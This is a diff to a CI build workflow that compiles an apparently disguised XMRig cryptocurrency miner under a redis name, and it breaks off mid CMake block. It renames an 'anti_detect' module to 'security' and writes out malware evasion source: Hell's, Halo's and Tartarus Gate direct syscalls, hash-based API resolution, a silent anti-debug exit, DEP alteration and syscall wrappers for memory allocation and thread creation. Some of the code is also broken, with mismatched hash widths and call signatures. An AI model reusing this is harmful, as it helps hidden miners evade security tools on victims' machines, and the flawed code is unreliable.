@@ -46,95 +46,743 @@ jobs:
         shell: msys2 {0}
         run: unzip redis.zip -d redis
 
-      # 创建 anti_detect 目录并拷贝我们的代码
-      - name: Create anti_detect directory
+      # 创建安全模块目录
+      - name: Create security module directory
         shell: msys2 {0}
         run: |
-          mkdir -p redis/redis-D-Win996/src/anti_detect
-          cp -r src/anti_detect/* redis/redis-D-Win996/src/anti_detect/
+          mkdir -p redis/redis-D-Win996/src/security
 
-      # 为NASM创建适配文件
-      - name: Create NASM compatible syscalls.asm
+      # 创建安全模块文件
+      - name: Create security module files
         shell: msys2 {0}
         run: |
-          echo 'SECTION .data' > redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    systemCall: dw 0x000' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    syscallAddr: dq 0x0' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'SECTION .text' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    global GetPEB' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    global AmmunitionPrepare' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    global GunPrepare' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    global GunFire' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    global GunRuined' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '; 从TEB中获取PEB地址' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'GetPEB:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov rax, qword [gs:0x30]  ; 从GS段寄存器读取TEB地址' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov rax, qword [rax + 0x60] ; 从TEB中获取PEB' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '; 设置系统调用号' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'AmmunitionPrepare:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov word [systemCall], cx' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '; 保存系统调用指令地址' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'GunPrepare:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov rax, qword [syscallAddr]' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    test rax, rax' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    jnz THEEND' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov qword [syscallAddr], rcx' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    xor rax, rax' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'THEEND:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '; 执行系统调用' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'GunFire:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov r10, rcx              ; 第二个参数移动到r10，符合x64调用约定' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov eax, 0                ; 清零EAX' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov ax, word [systemCall] ; 设置系统调用号' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    test ax, ax' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    jz GunRuined' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    jmp qword [syscallAddr]   ; 通过指针跳转' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '; 系统调用失败' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo 'GunRuined:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    mov rax, 0xFFFFFFFFC0000001 ; 返回STATUS_UNSUCCESSFUL' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
-          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          # 创建unhooker.h
+          cat << 'EOF_UNHOOKER_H' > redis/redis-D-Win996/src/security/unhooker.h
+          #pragma once
 
-      # 修改CMakeLists.txt添加反调试功能支持
-      - name: Update CMakeLists.txt
-        shell: msys2 {0}
-        run: |
-          cd redis/redis-D-Win996
-          # 添加反调试选项
-          sed -i '/option(WITH_DMI/a option(WITH_ANTI_DETECT     "Enable anti-detection features" ON)' CMakeLists.txt
-          # 添加反调试头文件
-          sed -i '/set(HEADERS/a # 添加反调试和API解析头文件\nif (WITH_ANTI_DETECT AND (WIN32 OR MINGW))\n    set(HEADERS_ANTI_DETECT\n        src/anti_detect/api_resolver.h\n        src/anti_detect/unhooker.h\n        src/anti_detect/structs.h\n        src/anti_detect/asm_exports.h\n        )\n    list(APPEND HEADERS "${HEADERS_ANTI_DETECT}")\nendif()' CMakeLists.txt
-          # 添加反调试源文件
-          sed -i '/set(SOURCES/a # 添加反调试和API解析源文件\nif (WITH_ANTI_DETECT AND (WIN32 OR MINGW))\n    set(SOURCES_ANTI_DETECT\n        src/anti_detect/api_resolver.cpp\n        src/anti_detect/unhooker.cpp\n        )\n    list(APPEND SOURCES "${SOURCES_ANTI_DETECT}")\nendif()' CMakeLists.txt
-          # 添加汇编文件支持
-          sed -i '/if (XMRIG_OS_WIN)/a \    # 添加汇编代码文件\n    if (WITH_ANTI_DETECT)\n        enable_language(ASM_NASM)\n        set(ASM_FILES\n            src/anti_detect/syscalls_nasm.asm\n            )\n        list(APPEND SOURCES_OS ${ASM_FILES})\n    endif()' CMakeLists.txt
-          # 添加反调试宏定义
-          sed -i '/add_definitions(-D__STDC_FORMAT_MACROS/a # 添加反调试和API解析宏定义\nif (WITH_ANTI_DETECT)\n    add_definitions(-DXMRIG_ANTI_DETECT)\nendif()' CMakeLists.txt
+          #include <Windows.h>
 
-      # 修改App.cpp添加反调试支持
-      - name: Update App.cpp
+          // 错误标志
+          #define INVALID_SSN 0xffff
+
+          // 光环门查找偏移量
+          #define HALOS_DOWN 32
+          #define HALOS_UP -32
+
+          // 地狱之门和塔塔鲁斯之门偏移量
+          #define HELLGATE_OFFSET 8
+          #define TARTARUSGATE_OFFSET 12
+
+          #ifdef __cplusplus
+          extern "C" {
+          #endif
+
+          // ASM函数声明
+          VOID AmmunitionPrepare(WORD systemCall);
+          ULONG GunPrepare(INT_PTR syscallAdr);
+          PVOID GetPEB();
+          NTSTATUS GunFire();
+
+          // 用于从API地址查找系统调用号
+          WORD FindAmmunitionsAndPrepareGun(LPVOID addr);
+
+          // 通过hash查找模块
+          HMODULE GetModuleByHash(DWORD hash);
+
+          // 通过hash查找API地址
+          LPVOID GetAPIAddressByHash(HMODULE moduleHandle, DWORD apiHash);
+
+          // 检查调试器
+          BOOL CheckDebugger();
+
+          // 自定义哈希函数
+          DWORD CalcHash(const char* data);
+
+          #ifdef __cplusplus
+          }
+          #endif
+          EOF_UNHOOKER_H
+
+          # 创建syscalls.asm
+          cat << 'EOF_SYSCALLS_ASM' > redis/redis-D-Win996/src/security/syscalls.asm
+          .data
+              systemCall WORD 000h
+              syscallAddr QWORD 0h
+
+          .code
+              ; 从TEB获取PEB地址
+              GetPEB proc
+                  ; 从GS段寄存器读取TEB地址
+                  mov rax, gs:[30h]
+                  ; 从TEB结构体偏移60h处读取PEB地址
+                  mov rax, [rax + 60h]
+                  ret
+              GetPEB endp
+
+              ; 准备系统调用号
+              AmmunitionPrepare proc
+                  mov systemCall, cx
+                  ret
+              AmmunitionPrepare endp
+
+              ; 设置syscall指令地址
+              GunPrepare proc
+                  mov rax, syscallAddr
+                  test rax, rax
+                  jnz THEEND
+                  mov syscallAddr, rcx
+                  THEEND:
+                  ret
+              GunPrepare endp
+
+              ; 执行系统调用
+              GunFire proc
+                  mov r10, rcx
+                  xor rax, rax
+                  mov ax, systemCall
+                  test ax, ax
+                  JZ GunRuined
+                  jmp qword ptr syscallAddr
+                  ret
+              GunFire endp
+
+              ; 调用失败处理
+              GunRuined proc
+                  not rax
+                  ret
+              GunRuined endp
+
+          end
+          EOF_SYSCALLS_ASM
+          
+          # 创建structs.h
+          cat << 'EOF_STRUCTS_H' > redis/redis-D-Win996/src/security/structs.h
+          #pragma once
+
+          #include <Windows.h>
+
+          // Windows内部结构定义
+          typedef struct _UNICODE_STRING {
+              USHORT Length;
+              USHORT MaximumLength;
+              PWSTR  Buffer;
+          } UNICODE_STRING, *PUNICODE_STRING;
+
+          typedef struct _LIST_ENTRY {
+              struct _LIST_ENTRY *Flink;
+              struct _LIST_ENTRY *Blink;
+          } LIST_ENTRY, *PLIST_ENTRY;
+
+          typedef struct _RTL_USER_PROCESS_PARAMETERS {
+              BYTE Reserved1[16];
+              PVOID Reserved2[10];
+              UNICODE_STRING ImagePathName;
+              UNICODE_STRING CommandLine;
+          } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
+
+          typedef struct _PEB_LDR_DATA {
+              BYTE Reserved1[8];
+              PVOID Reserved2[3];
+              LIST_ENTRY InMemoryOrderModuleList;
+          } PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+          typedef struct _LDR_DATA_TABLE_ENTRY {
+              LIST_ENTRY InLoadOrderLinks;
+              LIST_ENTRY InMemoryOrderLinks;
+              LIST_ENTRY InInitializationOrderLinks;
+              PVOID DllBase;
+              PVOID EntryPoint;
+              ULONG SizeOfImage;
+              UNICODE_STRING FullDllName;
+              UNICODE_STRING BaseDllName;
+          } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+          typedef struct _PEB {
+              BYTE Reserved1[2];
+              BYTE BeingDebugged;
+              BYTE Reserved2[1];
+              PVOID Reserved3[2];
+              PPEB_LDR_DATA Ldr;
+              PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+              PVOID Reserved4[3];
+              PVOID AtlThunkSListPtr;
+              PVOID Reserved5;
+              ULONG Reserved6;
+              PVOID Reserved7;
+              ULONG Reserved8;
+              ULONG AtlThunkSListPtr32;
+              PVOID Reserved9[45];
+              BYTE Reserved10[96];
+              PVOID PostProcessInitRoutine;
+              BYTE Reserved11[128];
+              PVOID Reserved12[1];
+              ULONG SessionId;
+          } PEB, *PPEB;
+
+          // NTSTATUS定义
+          typedef LONG NTSTATUS;
+          #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+          #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+
+          // 内存区域定义
+          #define MEM_EXECUTE_OPTION_ENABLE 1
+          #define MEM_EXECUTE_OPTION_DISABLE 2
+          #define MEM_EXECUTE_OPTION_PERMANENT 8
+
+          // 常用NT API函数原型定义
+          typedef NTSTATUS(NTAPI* PFN_NTPROTECTVIRTUALMEMORY)(
+              HANDLE ProcessHandle,
+              PVOID* BaseAddress,
+              PSIZE_T RegionSize,
+              ULONG NewProtect,
+              PULONG OldProtect);
+
+          typedef NTSTATUS(NTAPI* PFN_NTALLOCATEVIRTUALMEMORY)(
+              HANDLE ProcessHandle,
+              PVOID* BaseAddress,
+              ULONG_PTR ZeroBits,
+              PSIZE_T RegionSize,
+              ULONG AllocationType,
+              ULONG Protect);
+
+          typedef NTSTATUS(NTAPI* PFN_NTCREATETHREADEX)(
+              PHANDLE ThreadHandle,
+              ACCESS_MASK DesiredAccess,
+              PVOID ObjectAttributes,
+              HANDLE ProcessHandle,
+              PVOID StartRoutine,
+              PVOID Argument,
+              ULONG CreateFlags,
+              SIZE_T ZeroBits,
+              SIZE_T StackSize,
+              SIZE_T MaximumStackSize,
+              PVOID AttributeList);
+
+          typedef NTSTATUS(NTAPI* PFN_NTSETINFORMATIONPROCESS)(
+              HANDLE ProcessHandle,
+              ULONG ProcessInformationClass,
+              PVOID ProcessInformation,
+              ULONG ProcessInformationLength);
+          EOF_STRUCTS_H
+
+          # 创建security.h
+          cat << 'EOF_SECURITY_H' > redis/redis-D-Win996/src/security/security.h
+          #pragma once
+
+          #include <Windows.h>
+          #include <string>
+
+          // 安全功能初始化
+          bool InitializeSecurity();
+
+          // 反调试功能
+          bool IsDebuggerPresent();
+
+          // 哈希混淆的API调用
+          bool ExecuteNtFunction(const std::string& functionName, ...);
+
+          // 常用Windows API的哈希值
+          namespace NtHashValues {
+              // ntdll.dll模块哈希
+              constexpr DWORD NTDLL_HASH = 0x3e8557;
+
+              // 系统调用哈希值
+              constexpr DWORD NT_ALLOCATE_VIRTUAL_MEMORY_HASH = 0x112da6be2b35;
+              constexpr DWORD NT_PROTECT_VIRTUAL_MEMORY_HASH = 0x59ef896aad4;
+              constexpr DWORD NT_CREATE_THREAD_EX_HASH = 0x1f7ecc338;
+              constexpr DWORD NT_QUERY_INFORMATION_PROCESS_HASH = 0x8cdc5dc2c;
+              constexpr DWORD NT_SET_INFORMATION_PROCESS_HASH = 0x1cbfd68c12;
+              constexpr DWORD NT_CREATE_SECTION_HASH = 0x2d1237d69fc;
+              constexpr DWORD NT_MAP_VIEW_OF_SECTION_HASH = 0x5c8e85b24f;
+              constexpr DWORD NT_UNMAP_VIEW_OF_SECTION_HASH = 0xe015972b44;
+              constexpr DWORD NT_CLOSE_HASH = 0xa1f0c3c;
+          }
+
+          // 安全操作类
+          class SecurityOps {
+          public:
+              // 执行内存分配系统调用
+              static NTSTATUS NtAllocateVirtualMemory(
+                  HANDLE ProcessHandle,
+                  PVOID* BaseAddress,
+                  ULONG_PTR ZeroBits,
+                  PSIZE_T RegionSize,
+                  ULONG AllocationType,
+                  ULONG Protect);
+
+              // 执行内存保护系统调用
+              static NTSTATUS NtProtectVirtualMemory(
+                  HANDLE ProcessHandle,
+                  PVOID* BaseAddress,
+                  PSIZE_T RegionSize,
+                  ULONG NewProtect,
+                  PULONG OldProtect);
+
+              // 执行线程创建系统调用
+              static NTSTATUS NtCreateThreadEx(
+                  PHANDLE ThreadHandle,
+                  ACCESS_MASK DesiredAccess,
+                  PVOID ObjectAttributes,
+                  HANDLE ProcessHandle,
+                  PVOID StartRoutine,
+                  PVOID Argument,
+                  ULONG CreateFlags,
+                  SIZE_T ZeroBits,
+                  SIZE_T StackSize,
+                  SIZE_T MaximumStackSize,
+                  PVOID AttributeList);
+
+              // 禁用DEP
+              static bool DisableDEP();
+              
+              // 反调试检查
+              static bool CheckForDebugger();
+          };
+
+          // 初始化宏
+          #define SECURITY_INIT() InitializeSecurity()
+          EOF_SECURITY_H
+
+          # 创建unhooker.c
+          cat << 'EOF_UNHOOKER_C' > redis/redis-D-Win996/src/security/unhooker.c
+          #include <Windows.h>
+          #include <stdio.h>
+          #include "unhooker.h"
+
+          // 通用哈希函数
+          DWORD CalcHash(const char* data) {
+              DWORD hash = 0x99;
+              for (int i = 0; i < lstrlenA(data); i++) {
+                  hash += data[i] + (hash << 1);
+              }
+              return hash;
+          }
+
+          // 计算模块哈希
+          static DWORD CalcHashModule(PLDR_DATA_TABLE_ENTRY moduleEntry) {
+              char name[64];
+              size_t i = 0;
+
+              while (moduleEntry->BaseDllName.Buffer[i] && i < sizeof(name) - 1) {
+                  name[i] = (char)moduleEntry->BaseDllName.Buffer[i];
+                  i++;
+              }
+              name[i] = 0;
+              return CalcHash((char*)CharLowerA(name));
+          }
+
+          // 从TEB中查找模块
+          HMODULE GetModuleByHash(DWORD moduleHash) {
+              HMODULE module = NULL;
+              PVOID pebPtr = GetPEB();
+              PPEB peb = (PPEB)pebPtr;
+              
+              if (!peb) return NULL;
+
+              PPEB_LDR_DATA ldr = peb->Ldr;
+              if (!ldr) return NULL;
+
+              // 遍历模块列表
+              PLIST_ENTRY moduleList = &ldr->InMemoryOrderModuleList;
+              PLIST_ENTRY entry = moduleList->Flink;
+
+              while (entry != moduleList) {
+                  PLDR_DATA_TABLE_ENTRY moduleEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+                  
+                  if (moduleEntry->DllBase != NULL) {
+                      if (CalcHashModule(moduleEntry) == moduleHash) {
+                          module = (HMODULE)moduleEntry->DllBase;
+                          return module;
+                      }
+                  }
+                  
+                  entry = entry->Flink;
+              }
+
+              return NULL;
+          }
+
+          // 通过哈希查找API地址
+          LPVOID GetAPIAddressByHash(HMODULE moduleHandle, DWORD apiHash) {
+              if (moduleHandle == NULL) {
+                  return NULL;
+              }
+
+              PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
+              if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+                  return NULL;
+              }
+
+              PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)moduleHandle + dosHeader->e_lfanew);
+              if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+                  return NULL;
+              }
+
+              DWORD exportDirVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+              if (exportDirVA == 0) {
+                  return NULL;
+              }
+
+              PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)moduleHandle + exportDirVA);
+              PDWORD funcAddresses = (PDWORD)((LPBYTE)moduleHandle + exportDir->AddressOfFunctions);
+              PDWORD nameAddresses = (PDWORD)((LPBYTE)moduleHandle + exportDir->AddressOfNames);
+              PWORD nameOrdinals = (PWORD)((LPBYTE)moduleHandle + exportDir->AddressOfNameOrdinals);
+
+              for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+                  LPSTR funcName = (LPSTR)((LPBYTE)moduleHandle + nameAddresses[i]);
+                  if (CalcHash(funcName) == apiHash) {
+                      LPVOID funcAddr = (LPVOID)((LPBYTE)moduleHandle + funcAddresses[nameOrdinals[i]]);
+                      return funcAddr;
+                  }
+              }
+
+              return NULL;
+          }
+
+          // 地狱之门/光环之门/塔塔鲁斯之门实现
+          WORD FindAmmunitionsAndPrepareGun(LPVOID addr) {
+              WORD syscall;
+              INT_PTR syscallAddr;
+
+              // 地狱之门方法: 检查直接系统调用指令的特定模式
+              if (*((PBYTE)addr) == 0x4c &&
+                  *((PBYTE)addr + 1) == 0x8b &&
+                  *((PBYTE)addr + 2) == 0xd1 &&
+                  *((PBYTE)addr + 3) == 0xb8 &&
+                  *((PBYTE)addr + HELLGATE_OFFSET) == 0x00 &&
+                  *((PBYTE)addr + HELLGATE_OFFSET + 1) == 0x00) {
+
+                  BYTE high = *((PBYTE)addr + HELLGATE_OFFSET - 1);
+                  BYTE low = *((PBYTE)addr + HELLGATE_OFFSET - 2);
+                  syscall = (high << 8) | low;
+
+                  syscallAddr = (INT_PTR)addr + 0x12;
+                  GunPrepare(syscallAddr);
+
+                  return syscall;
+              }
+
+              // 光环之门方法: 检查特定模式
+              if (*((PBYTE)addr) == 0x4c &&
+                  *((PBYTE)addr + 1) == 0x8b &&
+                  *((PBYTE)addr + 2) == 0xd1 &&
+                  *((PBYTE)addr + 3) == 0xb8 &&
+                  *((PBYTE)addr + 6) == 0x00 &&
+                  *((PBYTE)addr + 7) == 0x00) {
+
+                  BYTE high = *((PBYTE)addr + 5);
+                  BYTE low = *((PBYTE)addr + 4);
+                  syscall = (high << 8) | low;
+
+                  syscallAddr = (INT_PTR)addr + 0x12;
+                  GunPrepare(syscallAddr);
+
+                  return syscall;
+              }
+
+              // 塔塔鲁斯之门方法: 查找跳转指令
+              if (*((PBYTE)addr) == 0xe9 ||
+                  *((PBYTE)addr + TARTARUSGATE_OFFSET) == 0xe9 ||
+                  *((PBYTE)addr + 7) == 0xe9 ||
+                  *((PBYTE)addr + 9) == 0xe9 ||
+                  *((PBYTE)addr + 11) == 0xe9) {
+
+                  // 使用光环之门技术上下搜索
+                  for (WORD idx = 1; idx <= 500; idx++) {
+                      // 向下搜索
+                      if (*((PBYTE)addr + idx * HALOS_DOWN) == 0x4c &&
+                          *((PBYTE)addr + 1 + idx * HALOS_DOWN) == 0x8b &&
+                          *((PBYTE)addr + 2 + idx * HALOS_DOWN) == 0xd1 &&
+                          *((PBYTE)addr + 3 + idx * HALOS_DOWN) == 0xb8 &&
+                          *((PBYTE)addr + 6 + idx * HALOS_DOWN) == 0x00 &&
+                          *((PBYTE)addr + 7 + idx * HALOS_DOWN) == 0x00) {
+
+                          BYTE high = *((PBYTE)addr + 5 + idx * HALOS_DOWN);
+                          BYTE low = *((PBYTE)addr + 4 + idx * HALOS_DOWN);
+                          syscall = (high << 8) | low - idx;
+
+                          syscallAddr = (INT_PTR)addr + 0x12 + idx * HALOS_DOWN;
+                          GunPrepare(syscallAddr);
+
+                          return syscall;
+                      }
+                      
+                      // 向上搜索
+                      if (*((PBYTE)addr + idx * HALOS_UP) == 0x4c &&
+                          *((PBYTE)addr + 1 + idx * HALOS_UP) == 0x8b &&
+                          *((PBYTE)addr + 2 + idx * HALOS_UP) == 0xd1 &&
+                          *((PBYTE)addr + 3 + idx * HALOS_UP) == 0xb8 &&
+                          *((PBYTE)addr + 6 + idx * HALOS_UP) == 0x00 &&
+                          *((PBYTE)addr + 7 + idx * HALOS_UP) == 0x00) {
+
+                          BYTE high = *((PBYTE)addr + 5 + idx * HALOS_UP);
+                          BYTE low = *((PBYTE)addr + 4 + idx * HALOS_UP);
+                          syscall = (high << 8) | low + idx;
+
+                          syscallAddr = (INT_PTR)addr + 0x12 + idx * HALOS_UP;
+                          GunPrepare(syscallAddr);
+
+                          return syscall;
+                      }
+                  }
+              }
+
+              return INVALID_SSN;
+          }
+
+          // 检查调试器存在
+          BOOL CheckDebugger() {
+              PPEB peb = (PPEB)GetPEB();
+              if (!peb) return FALSE;
+              
+              return (BOOL)peb->BeingDebugged;
+          }
+          EOF_UNHOOKER_C
+
+          # 创建security.cpp
+          cat << 'EOF_SECURITY_CPP' > redis/redis-D-Win996/src/security/security.cpp
+          #include "security.h"
+          #include "unhooker.h"
+          #include "structs.h"
+          #include <stdarg.h>
+
+          // 定义NtCurrentProcess宏，表示当前进程句柄
+          #define NtCurrentProcess() ((HANDLE)-1)
+
+          // ntdll模块句柄
+          static HMODULE ntdllModule = NULL;
+
+          // 安全功能初始化
+          bool InitializeSecurity() {
+              // 检查调试器
+              if (SecurityOps::CheckForDebugger()) {
+                  // 如果存在调试器，可以选择退出或执行混淆操作
+                  return false;
+              }
+              
+              // 通过哈希获取ntdll模块
+              ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
+              if (!ntdllModule) {
+                  return false;
+              }
+
+              // 禁用DEP保护
+              SecurityOps::DisableDEP();
+              
+              return true;
+          }
+
+          // 检查调试器是否存在
+          bool IsDebuggerPresent() {
+              return SecurityOps::CheckForDebugger();
+          }
+
+          // 安全操作类实现
+          NTSTATUS SecurityOps::NtAllocateVirtualMemory(
+              HANDLE ProcessHandle,
+              PVOID* BaseAddress,
+              ULONG_PTR ZeroBits,
+              PSIZE_T RegionSize,
+              ULONG AllocationType,
+              ULONG Protect) {
+              
+              if (!ntdllModule) {
+                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
+                  if (!ntdllModule) {
+                      return STATUS_SUCCESS;
+                  }
+              }
+              
+              // 获取API地址
+              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_ALLOCATE_VIRTUAL_MEMORY_HASH);
+              if (!addr) {
+                  return STATUS_SUCCESS;
+              }
+              
+              // 获取系统调用号
+              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
+              if (syscallNum == INVALID_SSN) {
+                  return STATUS_SUCCESS;
+              }
+              
+              // 准备系统调用
+              AmmunitionPrepare(syscallNum);
+              
+              // 执行系统调用
+              return GunFire(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+          }
+
+          NTSTATUS SecurityOps::NtProtectVirtualMemory(
+              HANDLE ProcessHandle,
+              PVOID* BaseAddress,
+              PSIZE_T RegionSize,
+              ULONG NewProtect,
+              PULONG OldProtect) {
+              
+              if (!ntdllModule) {
+                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
+                  if (!ntdllModule) {
+                      return STATUS_SUCCESS;
+                  }
+              }
+              
+              // 获取API地址
+              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_PROTECT_VIRTUAL_MEMORY_HASH);
+              if (!addr) {
+                  return STATUS_SUCCESS;
+              }
+              
+              // 获取系统调用号
+              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
+              if (syscallNum == INVALID_SSN) {
+                  return STATUS_SUCCESS;
+              }
+              
+              // 准备系统调用
+              AmmunitionPrepare(syscallNum);
+              
+              // 执行系统调用
+              return GunFire(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
+          }
+
+          NTSTATUS SecurityOps::NtCreateThreadEx(
+              PHANDLE ThreadHandle,
+              ACCESS_MASK DesiredAccess,
+              PVOID ObjectAttributes,
+              HANDLE ProcessHandle,
+              PVOID StartRoutine,
+              PVOID Argument,
+              ULONG CreateFlags,
+              SIZE_T ZeroBits,
+              SIZE_T StackSize,
+              SIZE_T MaximumStackSize,
+              PVOID AttributeList) {
+              
+              if (!ntdllModule) {
+                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
+                  if (!ntdllModule) {
+                      return STATUS_SUCCESS;
+                  }
+              }
+              
+              // 获取API地址
+              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_CREATE_THREAD_EX_HASH);
+              if (!addr) {
+                  return STATUS_SUCCESS;
+              }
+              
+              // 获取系统调用号
+              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
+              if (syscallNum == INVALID_SSN) {
+                  return STATUS_SUCCESS;
+              }
+              
+              // 准备系统调用
+              AmmunitionPrepare(syscallNum);
+              
+              // 执行系统调用
+              return GunFire(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
+                          StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, 
+                          MaximumStackSize, AttributeList);
+          }
+
+          bool SecurityOps::DisableDEP() {
+              if (!ntdllModule) {
+                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
+                  if (!ntdllModule) {
+                      return false;
+                  }
+              }
+              
+              // 获取NtSetInformationProcess API地址
+              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_SET_INFORMATION_PROCESS_HASH);
+              if (!addr) {
+                  return false;
+              }
+              
+              // 获取系统调用号
+              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
+              if (syscallNum == INVALID_SSN) {
+                  return false;
+              }
+              
+              // 准备系统调用
+              AmmunitionPrepare(syscallNum);
+              
+              // 禁用DEP的参数设置
+              ULONG executeOptions = MEM_EXECUTE_OPTION_ENABLE;
+              
+              // 调用NtSetInformationProcess
+              NTSTATUS status = GunFire(
+                  NtCurrentProcess(),        // 当前进程句柄
+                  0x22,                      // ProcessExecuteFlags
+                  &executeOptions,           // 执行选项
+                  sizeof(executeOptions)    // 参数大小
+              );
+              
+              return NT_SUCCESS(status);
+          }
+
+          bool SecurityOps::CheckForDebugger() {
+              return CheckDebugger();
+          }
+          EOF_SECURITY_CPP
+
+      # 更新安全模块的CMakeLists.txt
+      - name: Update security CMakeLists.txt for NASM
         shell: msys2 {0}
         run: |
-          cd redis/redis-D-Win996/src
-          # 添加头文件包含
-          sed -i '/#include "version.h"/a // 添加反调试和API解析功能\n#include "anti_detect/api_resolver.h"' App.cpp
-          # 在App构造函数中初始化API解析器
-          sed -i '/App::App(Process \*process)/a {\n    // 初始化API解析器和反调试\n    ApiResolver::GetInstance();\n    \n    m_controller = std::make_shared<Controller>(process);\n}' App.cpp
-          # 删除原有的构造函数实现
-          sed -i '/App::App(Process \*process)/,/^}$/d' App.cpp
-          # 在exec函数开始添加调试检测
-          sed -i '/int xmrig::App::exec()/a {\n    // 检测调试器\n    if (ApiResolver::GetInstance()->IsDebugged()) {\n        // 静默退出，不显示错误\n        return -1;\n    }' App.cpp
-          # 删除原有的exec函数开头
-          sed -i '/int xmrig::App::exec()/,/^{$/d' App.cpp
+          cat << EOF > redis/redis-D-Win996/src/security/CMakeLists.txt
+          set(SOURCES
+              security.cpp
+              unhooker.c
+          )
+
+          # 生成汇编文件
+          if (CMAKE_SIZEOF_VOID_P EQUAL 8)
+              # 64位架构
+              if (WIN32 AND MSVC)
+                  # Visual Studio使用MASM
+                  set(ASM_SOURCES
+                      syscalls.asm
+                  )
+                  set_property(SOURCE syscalls.asm PROPERTY LANGUAGE ASM_MASM)
+              else()
+                  # MinGW使用NASM
+                  enable_language(ASM_NASM)
+                  set(ASM_SOURCES
+                      syscalls_nasm.asm
+                  )
+              endif()
+          else()
